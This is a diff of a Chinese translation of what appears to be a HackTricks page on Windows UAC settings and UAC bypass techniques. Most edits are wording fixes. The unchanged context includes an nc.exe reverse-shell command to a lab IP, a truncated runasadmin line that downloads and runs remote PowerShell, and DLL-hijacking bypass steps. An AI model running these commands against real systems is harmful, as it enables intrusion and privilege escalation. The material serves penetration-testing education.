@@ -12,11 +12,11 @@
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-当 UAC 生效时，管理员用户会获得 2 个令牌：一个标准用户密钥，用于以常规级别执行常规操作，以及一个具有管理员权限的令牌。
+当 UAC 生效时，管理员用户会获得 2 个令牌：一个标准用户密钥，用于以常规级别执行常规操作，另一个则具有管理员权限。
 
 此 [页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 深入讨论了 UAC 的工作原理，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地级别（使用 secpol.msc）配置 UAC 的工作方式，或通过组策略对象 (GPO) 在 Active Directory 域环境中配置并推送。各种设置在 [这里](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) 进行了详细讨论。可以为 UAC 设置 10 个组策略设置。以下表格提供了更多详细信息：
 
-| 组策略设置                                                                                                                                                                                                                                                                                                                                                           | 注册表项                | 默认设置                                              |
+| 组策略设置                                                                                                                                                                                                                                                                                                                                                           | 注册表键                | 默认设置                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
 | [用户帐户控制：内置管理员帐户的管理员批准模式](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 禁用                                                     |
 | [用户帐户控制：允许 UIAccess 应用程序在不使用安全桌面的情况下提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 禁用                                                     |
@@ -46,7 +46,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-如果是 **`1`**，则 UAC 是 **激活** 的；如果是 **`0`** 或 **不存在**，则 UAC 是 **未激活** 的。
+如果是 **`1`**，则 UAC **已激活**；如果是 **`0`** 或者 **不存在**，则 UAC **未激活**。
 
 然后，检查 **配置的级别**：
 ```
@@ -56,17 +56,17 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 - 如果 **`0`**，则 UAC 不会提示（如 **禁用**）
-- 如果 **`1`**，管理员会被 **要求输入用户名和密码** 以高权限执行二进制文件（在安全桌面上）
-- 如果 **`2`**（**始终通知我**），UAC 将始终在管理员尝试以高权限执行某些操作时要求确认（在安全桌面上）
+- 如果 **`1`**，则管理员会被 **要求输入用户名和密码** 以高权限执行二进制文件（在安全桌面上）
+- 如果 **`2`** （**始终通知我**），当管理员尝试以高权限执行某些操作时，UAC 将始终要求确认（在安全桌面上）
 - 如果 **`3`**，类似于 `1`，但不一定在安全桌面上
 - 如果 **`4`**，类似于 `2`，但不一定在安全桌面上
 - 如果 **`5`**（**默认**），它会要求管理员确认以高权限运行非 Windows 二进制文件
 
 然后，您需要查看 **`LocalAccountTokenFilterPolicy`** 的值\
-如果值为 **`0`**，则只有 **RID 500** 用户（**内置管理员**）能够在 **没有 UAC** 的情况下执行 **管理员任务**，如果为 `1`，则 **“Administrators”** 组中的所有帐户都可以执行这些任务。
+如果值为 **`0`**，则只有 **RID 500** 用户（**内置管理员**）能够在没有 UAC 的情况下执行 **管理员任务**，如果为 `1`，则 **“Administrators”** 组中的所有帐户都可以执行这些任务。
 
-最后查看 **`FilterAdministratorToken`** 键的值\
-如果 **`0`**（默认），**内置管理员帐户可以** 执行远程管理任务，如果 **`1`**，则内置管理员帐户 **无法** 执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 设置为 `1`。
+最后，查看 **`FilterAdministratorToken`** 键的值\
+如果 **`0`**（默认），则 **内置管理员帐户可以** 执行远程管理任务；如果 **`1`**，则内置管理员帐户 **无法** 执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 设置为 `1`。
 
 #### 总结
 
@@ -75,7 +75,7 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 - 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=0` 且 `FilterAdministratorToken=0`，对 RID 500（内置管理员）没有 UAC**
 - 如果 `EnableLua=1` 且 **`LocalAccountTokenFilterPolicy=0` 且 `FilterAdministratorToken=1`，对所有人都有 UAC**
 
-所有这些信息可以使用 **metasploit** 模块收集： `post/windows/gather/win_privs`
+所有这些信息可以通过 **metasploit** 模块收集： `post/windows/gather/win_privs`
 
 您还可以检查用户的组并获取完整性级别：
 ```
@@ -89,7 +89,7 @@ whoami /groups | findstr Level
 
 UAC 绕过在以下情况下是必要的：**UAC 已激活，您的进程在中等完整性上下文中运行，并且您的用户属于管理员组**。
 
-重要的是要提到，如果 UAC 处于最高安全级别（始终），则**绕过 UAC 要比在其他任何级别（默认）下困难得多**。
+重要的是要提到，如果 UAC 处于最高安全级别（始终），则**绕过 UAC 要比在其他任何级别（默认）中要困难得多**。
 
 ### UAC 禁用
 
@@ -99,14 +99,14 @@ UAC 绕过在以下情况下是必要的：**UAC 已激活，您的进程在中�
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC 绕过与令牌复制
+#### UAC绕过与令牌复制
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **非常** 基本的 UAC "绕过"（完全文件系统访问）
+### **非常** 基本的UAC "绕过"（完全文件系统访问）
 
-如果你有一个属于管理员组的用户的 shell，你可以 **通过 SMB 挂载 C$** 共享到一个新的磁盘上，这样你将 **访问到文件系统中的所有内容**（甚至是管理员的主文件夹）。
+如果你有一个在Administrators组内的用户的shell，你可以**通过SMB挂载C$**共享到一个新的磁盘上，你将**访问文件系统内的所有内容**（甚至是Administrator的主文件夹）。
 
 > [!WARNING]
 > **看起来这个技巧不再有效**
@@ -142,7 +142,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 [**UACME** ](https://github.com/hfiref0x/UACME) 是几个 UAC 绕过漏洞的 **汇编**。请注意，您需要 **使用 Visual Studio 或 msbuild 编译 UACME**。编译将创建几个可执行文件（如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），您需要知道 **您需要哪个**。\
 您应该 **小心**，因为某些绕过会 **提示其他程序**，这会 **警告** **用户** 有事情发生。
 
-UACME 有 **每个技术开始工作的构建版本**。您可以搜索影响您版本的技术：
+UACME 有 **每种技术开始工作的构建版本**。您可以搜索影响您版本的技术：
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -150,11 +150,11 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-也可以使用 [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 页面获取 Windows 版本 `1607` 的构建版本。
+也可以通过 [this](https://en.wikipedia.org/wiki/Windows_10_version_history) 页面获取 Windows 版本 `1607` 的构建版本。
 
 #### 更多 UAC 绕过
 
-**所有**用于绕过 AUC 的技术 **需要** 与受害者的 **完整交互式 shell**（普通的 nc.exe shell 不够）。
+**所有**在这里使用的绕过 AUC 的技术 **都需要**与受害者的 **完整交互式 shell**（普通的 nc.exe shell 不够）。
 
 您可以使用 **meterpreter** 会话获取。迁移到 **Session** 值等于 **1** 的 **进程**：
 
@@ -174,7 +174,7 @@ Major  Minor  Build  Revision
 
 ### 您自己的绕过 - 基本 UAC 绕过方法
 
-如果您查看 **UACME**，您会注意到 **大多数 UAC 绕过利用 Dll Hijacking 漏洞**（主要是在 _C:\Windows\System32_ 中写入恶意 dll）。 [阅读此内容以了解如何找到 Dll Hijacking 漏洞](../windows-local-privilege-escalation/dll-hijacking/)。
+如果您查看 **UACME**，您会注意到 **大多数 UAC 绕过利用 Dll Hijacking 漏洞**（主要是在 _C:\Windows\System32_ 中写入恶意 dll）。 [阅读此内容以了解如何找到 Dll Hijacking 漏洞](../windows-local-privilege-escalation/dll-hijacking/index.html)。
 
 1. 找到一个会 **自动提升** 的二进制文件（检查它执行时是否以高完整性级别运行）。
 2. 使用 procmon 查找可能受到 **DLL Hijacking** 影响的 "**NAME NOT FOUND**" 事件。
@@ -185,6 +185,6 @@ Major  Minor  Build  Revision
 
 ### 另一种 UAC 绕过技术
 
-该技术是观察是否有 **自动提升的二进制文件** 尝试 **从注册表** 中 **读取** 要 **执行** 的 **二进制文件** 或 **命令** 的 **名称/路径**（如果二进制文件在 **HKCU** 中搜索此信息，则更有趣）。
+该技术是观察一个 **自动提升的二进制文件** 是否尝试 **从注册表** 中 **读取** 要 **执行** 的 **二进制文件** 或 **命令** 的 **名称/路径**（如果二进制文件在 **HKCU** 中搜索此信息，则更有趣）。
 
 {{#include ../../banners/hacktricks-training.md}}
